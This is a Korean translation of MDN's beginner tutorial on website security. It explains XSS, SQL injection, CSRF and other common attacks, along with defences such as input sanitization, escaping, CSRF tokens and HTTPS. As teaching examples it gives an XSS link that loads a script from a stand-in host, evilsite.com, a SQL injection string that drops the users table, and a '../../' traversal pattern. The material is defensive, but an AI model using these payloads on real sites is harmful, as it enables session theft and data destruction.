웹사이트 보안
-------------

이 문서는 저작자 동의없이 KAIST 대학정보화사업팀을 위하여 [Website Security](https://developer.mozilla.org/en-US/docs/Learn/Server-side/First_steps/Web_frameworks)를 번역 편집하여 작성한 것입니다.

웹사이트 보안은 웹사이트 디자인 및 사용 모든 면에서 주의를 기울여야 합니다. 이 소개 페이지로 웹사이트 보안 전문가가 될 수는 없지만 위협이 어디에서 오고, 가장 일반적인 공격으로 부터 웹 애플리케이션을 강화하기 위해 할 수있는 일을 이해하는 데 도움을 줄 것입니다.

> 선수지식: 기본적인 컴퓨터 지식
>
> 목표: 웹 애플리케이션 보안에 대한 가장 일반적인 위협을 이해하고 해킹 당할 위험을 줄이려면 어떻게해야 할까요?

### 웹사이트 보안이란?

인터넷은 위험한 곳입니다! 종종 서비스 거부 공격으로 웹 사이트를 사용할 수 없거나 홈페이지에 (종종 해를 끼치는) 정보가 수정되었다는 소식을 듣습니다. 잘 알려진 바와 같이 수백만 개의 암호, 전자 메일 주소 및 신용 카드 세부 정보가 공개 도메인에 유출되어 웹 사이트 사용자가 개인적으로 당황하거나 재정적 위험에 노출될 수 있습니다.

웹사이트 보안의 목적은 이러한(또는 어떤) 종류의 공격을 방지하는 것입니다. 웹사이트 보안에 대한 보다 공식적인 정의는 무단 접근, 사용, 수정, 파괴 또는 중단으로부터 웹사이트를 보호하는 행위와 실행입니다.

효과적인 웹사이트 보안을 위해서는 웹 응용프로그램, 웹 서버 구성, 암호 생성 및 갱신 정책, 클라이언트사이드 코드 등 웹사이트 전반에 걸친 설계 작업이 필요합니다. 모든 것이 매우 불길한 것처럼 들리지만 좋은 소식은 서버사이드 웹 프레임워크를 사용하면 보다 일반적인 공격에 대해 견고하고 잘 고려된 방어 메커니즘을 "기본적으로" 활성화할 수 있다는 것입니다. 다른 공격은 웹 서버 구성을 통해 완화할 수 있습니다 (예 : HTTPS 사용). 마지막으로, 명백한 실수가 있었는지 확인하는 데 도움이 되는 공개적으로 사용 가능한 취약성 스캐너 도구가 있습니다.

나머지 부분에서는 몇 가지 일반적인 위협 및 사이트 보호를 위해 취할 수 있는 간단한 단계에 대해 자세히 설명합니다.

> **note** : 웹 사이트 보안에 대한 고려를 시작할 수 있도록 작성된 입문이어서 모든 것에 대하여 설명하지 않습니다.

### 웹사이트 보안 위협

이 섹션에는 가장 일반적인 웹 사이트 위협 요소와 그 완화 방법을 설명합니다. 잘 알려진 바와 같이 웹 응용프로그램이 브라우저가 보내는 데이터를 충분히 신뢰하거나 위협 의도가 없다고 믿었을 때 웹사이트에 대한 위협이 가장 성공적이었다는 것을 보여줍니다.

#### Cross-Site 스크립팅(XSS)

XSS는 공격자가 웹 사이트를 통해 클라이언트사이드 스크립트를 다른 사용자의 브라우저에 주입 할 수있는 공격 유형을 설명하는 데 사용되는 용어입니다. 삽입된 코드는 사이트에서 브라우저로 전송되기 때문에 코드를 <i>신뢰</i>할 수 있어 사용자의 사이트 권한 쿠키를 공격자에게 보낼 수 있습니다. 공격자가 쿠키를 가지면 사용자인 것처럼 사이트에 로그인할 수 있으며 신용 카드 정보에 접근하거나 연락처 정보를 확인하거나 암호를 변경하는 등 사용자가 할 수 있는 모든 작업을 할 수 있습니다.

> **note** : XSS 취약점은 다른 유형의 보안 위협보다 더 일반적으로 발생합니다.

XSS 취약점은 사이트가 삽입된 스크립트를 브라우저에 반환하는 방법에 따라 <i>반향된(reflected)</i> 것과 <i>지속적인(persistent)</i> 것으로 나눌 수 있습니다.

-	<i>반향된</i> XSS 취약점은 서버에 전달된 사용자 컨텐트가 브라우저에 즉시 표시되고 수정되지 않은 상태로 반환 될 때 발생합니다. 새 페이지가 로드되면 원본 사용자 컨텐트의 스크립트가 실행됩니다. 예를 들어, 검색어가 URL 매개 변수로 인코딩되는 사이트 검색 기능에서 결과와 함께 검색어를 표시합니다. 공격자는 매개변수를 포함하는 악성 스크립트로 검색 링크를 구성 할 수 있습니다 (예 : <code>http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js">< script></code>)를 작성하여 다른 사용자에게 전자 메일로 보냅니다. 대상 사용자가 이 "흥미있는 링크"를 클릭하면 검색 결과가 표시될 때 스크립트가 실행됩니다. 앞에서 설명한 것처럼 공격자는 대상 사용자가 사이트에 들어가는 데 필요한 모든 정보를 제공하여 사용자로 구매하거나 연락처 정보를 공유할 수 있습니다.
-	<i>지속적</i> XSS 취약점은 악의적인 스크립트가 웹사이트에 저장되어 다른 사용자가 무의식적으로 실행하여 수정되지 않은 상태로 나중에 이를 다시 볼 때 발생합니다. 예를 들어, 수정되지 않은 HTML이 포함된 커멘트를 허용하는 토론 게시판에 공격자가 보낸 악의적인 스크립트를 저장할 수 있습니다. 커멘트를 보면 스크립트가 실행되어 사용자 계정에 접근하는 데 필요한 정보를 공격자에게 보낼 수 있습니다. 공격자는 피해자와 직접적인 관계가 없기 때문에 이러한 종류의 공격은 매우 인기가 있고 강력합니다.

<code>POST</code> 또는 <code>GET</code> 요청 데이터가 XSS 취약점의 가장 일반적인 소스이지만 브라우저가 렌더링한 쿠키 데이터 또는 업로드되거나 보여진 사용자 파일과 같은 브라우저에서 오는 데이터는 잠재적으로 취약합니다.

XSS 취약점에 대한 최선의 방어책은 코드를 실행하기위한 명령어를 잠재적으로 포함하는 마크업을 제거하거나 비활성화하는 것입니다. HTML의 경우 <code>\<script\></code>, <code>\<object\></code>, <code>\<embed\></code>, <code>\<link\></code>등 입니다.

스크립트를 실행하거나 서버 코드의 실행에 영향을 미치지 않도록 사용자 데이터를 수정하는 프로세스를 입력 삭제(input sanitization)라고 합니다. 대부분의 웹 프레임워크에서는 기본적으로 HTML 양식의 사용자 입력을 자동으로 삭제합니다.

#### SQL 주입

SQL 주입 취약점은 악의적인 사용자가 임의의 SQL 코드를 데이터베이스에서 실행할 수 있게 하여 사용자 권한에 관계없이 데이터를 접근, 수정 또는 삭제할 수 있도록 합니다. 성공적인 주입 공격은 신원을 속이거나(spoof), 관리 권한으로 새로운 신원을 만들거나, 서버의 모든 데이터에 접근하거나, 데이터를 파괴 또는 수정하여 데이터베이스를 사용하지 못하게 만들 수 있습니다.

SQL 주입 유형에는 오류 기반 SQL 주입, 부울 오류 기반 SQL 주입, 시간 기반 SQL 주입 등이 있습니다.

이 취약점은 사용자 입력으로 전달된 SQL 문의 의미를 변경할 수 있는 경우 나타납니다. 예를 들어 다음 코드는 HTML 양식에서 제공하는 특정 이름(<code>userName</code>)의 사용자 모두를 나열하기 위한 것입니다.

<code> statement = "SELECT * FROM users WHERE name = '" + **userName** + "';"</code>

사용자가 실제 이름을 지정하면 명령문이 의도 한대로 작동합니다. 그러나 악의적인 사용자는 <code>userName</code>에 대해 굵게 표시된 텍스트를 지정하여 새 명령문으로 이 SQL 문의 실행을 완전히 바꿀 수 있습니다.

<code> statement = "SELECT * FROM users WHERE name = '**a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';**</code>

수정된 명령문은 사용자 테이블을 삭제하고 userinfo 테이블에서 모든 데이터를 검색하는 SQL 문을 생성합니다 (모든 사용자의 정보를 나타냄). 이는 삽입된 텍스트의 첫 번째 부분( a';)이 원래 명령문을 완료하기 때문에 작동합니다.

이러한 종류의 공격을 피하려면 SQL 쿼리로 전달되는 사용자 데이터가 쿼리의 특성을 변경할 수 없도록 해야 합니다. 이를 수행하는 한 가지 방법은 SQL에서 특별한 의미를 갖는 사용자 입력의 모든 문자를 escape 처리하는 것입니다.

> **note** : SQL 문은 " ' "를 문자열 리터럴의 시작과 끝으로 처리합니다. 이 문자 앞에 백슬래시('\')를 두어 문자 " ' "를 escape 처리하고 (" \\' "), SQL에 문자(문자열의 부분으로)로 대신 처리하도록 지시합니다.

다음 문장에서는 " ' "문자를 escape합니다. SQL은 굵게 표시된 전체 문자열을 이름으로 해석합니다 (매우 이상한 이름이지만 실제로는 유해하지 않습니다).

<code> statement = "SELECT * FROM users WHERE name = '**a\\';DROP TABLE users; SELECT * FROM userinfo WHERE \\'t\\' = \\'t';**</code>

웹 프레임워크는 종종 사용자를 위해 ESC 문자를 삽입합니다. 예를 들어 Django는 쿼리 세트 (모델 쿼리)에 전달되는 모든 사용자 데이터를 escape 처리합니다.

> **note** : 이 섹션에서는 [위키피디아](https://en.wikipedia.org/wiki/SQL_injection)의 정보를 많이 인용하였습니다.

#### Cross-Site 요청 위조

CSRF 공격은 악의있는 사용자가 다른 사용자의 자격 증명을 사용하여 해당 사용자의 지식이나 동의없이 작업을 실행할 수 있도록 합니다.

예제를 통해 이 유형의 공격을 가장 잘 설명할 수 있습니다. John은 특정 사이트에서 로그인 한 사용자가 계정 이름과 금액을 포함하는 HTTP <code>POST</code> 요청을 사용하여 지정된 계정으로 돈을 보낼 수 있음을 알고 있는 악의적인 사용자입니다. John은 은행 세부 정보와 금액을 숨겨진 필드를 포함하는 양식을 구성하고 다른 사이트 사용자에게 이메일로 보냅니다 (제출 버튼은 "get rich quick" 사이트에 대한 링크로 가장합니다).

사용자가 제출 버튼을 클릭하면 트랜잭션 세부 정보와 브라우저가 사이트와 관련된 모든 클라이언트사이드 쿠키를 포함한 HTTP POST 요청이 서버로 전송됩니다 (요청에 연결된 사이트 쿠키를 추가하는 것이 정상적인 브라우저 동작입니다). 서버는 쿠키를 검사하여 사용자가 로그인되어 있고 트랜잭션을 수행 할 수 있는 권한 여부를 검사합니다.

그 결과 거래 사이트에 로그인되어 있는 동안 제출 단추를 클릭한 모든 사용자가 트랜잭션을 수행합니다. 존은 부자가 됩니다.

> **note** : 이 트릭은 John이 사용자 쿠키 (또는 접근 자격 증명)을 접근할 필요가 없다는 것입니다. 사용자의 브라우가 이 정보를 저장하고 연관된 서버에 대한 모든 요청에 이 정보를 자동으로 포함시킵니다.

이러한 유형의 공격을 방지하는 한 방법은 서버가 <code>POST</code> 요청에 사용자별 사이트 생성 암호를 포함하도록 요구하는 것입니다. 전송에 사용되는 웹 양식을 보낼 때 서버가 암호를 제공합니다. 이 접근법은 John이 서버가 사용자에게 제공하는 암호를 알아야 하기 때문에 John이 자신의 양식을 만들 수 없도록 합니다. 그가 특정 사용자에 대한 암호를 알아 내고 양식을 만들었더라도, 더 이상 이를 사용하여 다른 모든 사용자를 공격 할 수 없습니다.

웹 프레임워크는 종종 그러한 CSRF 방지 메커니즘을 포함하고 있습니다.

#### 기타 위협

기타 일반적인 공격 또는 취약점은 다음과 같습니다.

-	[클릭 재킹(clickjacking)](https://www.owasp.org/index.php/Clickjacking): 이 공격에서 악의적 인 사용자는 표시된 최상위 사이트에 대한 클릭을 가로 채어 그 아래의 숨겨진 페이지로 라우팅합니다. 예를 들면, 이 기술은 합법적 인 은행 사이트를 표시하는 데 사용되지만 공격자가 제어하는 보이지 않는 <code>\<iframe\></code>에 로그인 자격 증명을 캡처합니다. 클릭 재킹은 또한 사용자가 보여지는 사이트의 버튼을 클릭하도록 유도하지만, 실제는 그러하지 않고 완전히 다른 버튼을 클릭하게 되는 것입니다. 방어 차원에서 사이트는 적절한 HTTP 헤더를 설정하여 다른 사이트의 iframe에 포함되지 않도록 할 수 있습니다.
-	[서비스 거부 (DoS)](https://developer.mozilla.org/en-US/docs/Glossary/Distributed_Denial_of_Service): 일반적으로 가짜 요청으로 대상 사이트를 범람시켜 합법적인 사용자가 사이트에 접근하는 것을 방해함으로써 DoS를 성취합니다. 요청은 단순히 많을 수도 있고 대량의 리소스를 개별적으로 요청할 수도 있습니다 (예 : 대용량 파일의 느린 읽기 또는 업로드). DoS 방어는 일반적으로 "불량"트래픽을 식별하고 차단함으로써 정상적인 메시지를 통과하도록 합니다. 이러한 방어는 일반적으로 웹서버 이전 또는 웹서버에 위치합니다 (웹 응용프로그램 자체에는 이러한 기능이 없습니다).
-	[디렉토리 순회 (파일 및 폭로)](https://en.wikipedia.org/wiki/Directory_traversal_attack): 이 공격에서 악의적인 사용자는 접근할 수 없는 웹서버 파일 시스템의 일부를 접근하려고 시도합니다. 이 취약점은 사용자가 파일 시스템 탐색 문자 (예 : ../../)를 포함한 파일 이름을 전달할 때 발생합니다. 해결책은 사용하기 전에 이를 검사하는 것입니다.
-	[파일 포함](https://en.wikipedia.org/wiki/File_inclusion_vulnerability): 이 공격에서 사용자가 서버로 전달되는 데이터의 표기 또는 실행에 "의도하지 않은" 파일을 지정하는 것입니다. 로드될 때 이 파일은 웹서버 또는 클라이언트사이드에서 실행될 수 있습니다 (XSS 공격으로 이어질 수 잇습니다). 해결책은 사용하기 전 입력을 검사하는 것입니다.
-	[명령 주입](https://www.owasp.org/index.php/Command_Injection): 명령 주입 공격은 악의적인 사용자가 임의의 시스템 명령을 호스트 운영 체제에서 실행하는 것입니다. 해결책은 시스템 호출 사용 전에 사용자 입력을 검사하는 것입니다.

웹사이트 보안 위협에 대한 포괄적인 목록은 [Category: Web security exploits](https://en.wikipedia.org/wiki/Category:Web_security_exploits) (Wikipedia) 및 [Category: Attack](https://www.owasp.org/index.php/Category:Attack) (Open Web Application Security Project)을 참조하십시오.

### 몇몇 주요 메시지

웹 응용프로그램이 브라우저의 데이터를 신뢰할 때 이전 섹션의 거의 모든 보안 문제를 해결할 수 있습니다. 웹 사이트의 보안을 향상시키기 위해 수행하는 작업이 무엇이든 브라우저에 표시하거나 SQL 쿼리에 사용하거나 운영 체제 또는 파일 시스템 호출로 전달하기 전에 사용자가 생성 한 모든 데이터를 검사하여야 합니다.

> **중요**: 웹사이트 보안에 대해 배울 수 있는 가장 중요한 교훈은 **브라우저에서 오는 데이터를 절대 신뢰하지 않는 것입니다**. 여기에는 <code>GET</code> 요청, <code>POST</code> 요청, HTTP 헤더 및 쿠키 및 사용자 업로드 파일의 URL 매개변수에있는 데이터가 포함되지만 이에 국한되지는 않습니다. 항상 입력되는 모든 데이터를 확인하고 검사 처리하십시오. 항상 최악의 상황을 가정하십시오.

취할 수있는 구체적인 단계는 다음과 같습니다.

-	보다 효과적인 암호 관리: 정기적으로 변경되는 강력한 암호를 권장하십시오. 사이트에 대한 암호 외에도 사용자가 다른 인증 코드(일반적으로 스마트 폰처럼 사용자만 보유하고 있는 물리적 하드웨어를 통해 전달할 수 있는 SMS의 코드)를 입력하여야 하는 2 단계 인증을 고려해야 합니다.
-	[HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/https) 및 [HTTP Strict Transport Security(HSTS)](https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security)를 사용하는 웹서버 구성: HTTPS는 클라이언트와 서버간에 전송되는 데이터를 암호화 합니다. 이렇게하면 로그인 자격 증명, 쿠키, <code>POST</code> 요청 데이터 및 헤더 정보를 공격자가 쉽게 사용할 수 없게 됩니다.
-	(현재 [OWASP 목록](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)이 있는) 가장 보편적인 위협을 추적하고 가장 일반적인 취약점을 먼저 해결합니다.
-	[취약점 검색 도구](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools)를 사용하여 자동화된 보안 테스트 수행: 나중에 [Mozilla와 같이](https://www.mozilla.org/en-US/security/bug-bounty/faq-webapp/) 버그 현상금을 제공하여 매우 성공적인 웹 사이트는 버그를 찾을 수 있습니다.
-	필요한 데이터만 저장하고 보여주십시오. 예를 들어 사용자가 신용 카드 정보와 같은 중요한 정보를 저장해야하는 경우 사용자가 식별할 수있는 카드 번호만 표시하면 공격자가 복사하여 다른 사이트에서 사용할 수는 없습니다. 현재 가장 일반적인 패턴은 신용 카드 번호의 마지막 4 자리 숫자만 표시하는 것입니다.

웹 프레임워크는 보다 일반적인 많은 취약점을 완화하는 데 도움을 줄 수 있습니다.

### 요약

이 단계에서 웹 보안의 개념과 웹사이트가 보호해야 할 일반적인 위협에 대해 설명했습니다. 가장 중요한 점은 웹 응용프로그램은 웹 브라우저의 데이터를 신뢰하지 않아야 한다는 것을 이해해야 합니다. 모든 사용자 데이터를 보이기 전에 검사하여야 하여 SQL 쿼리 및 파일 시스템 호출에 사용되어야 합니다.

이 단계는 서버사이드 웹 사이트 프로그래밍의 첫 걸음을 다룬 [단원](webProgrammingFramework.md)의 끝입니다. 이 단원에서 설명한 기본 개념을 익혔습니다. 이제 여러분은 웹 프레임워크를 선택하여 프로그래밍을 시작할 준비가 되었습니다.

### 이 단원에서 아래 단계를 다룹니다.

-	[서버사이드 소개](introServer.md)
-	[클라이언트-서버 개요](clientServerOverview.md)
-	[서버사이드 웹 프레임워크](webFrameWork.md)
-	[웹사이트 보안](webSiteSecurity.md)
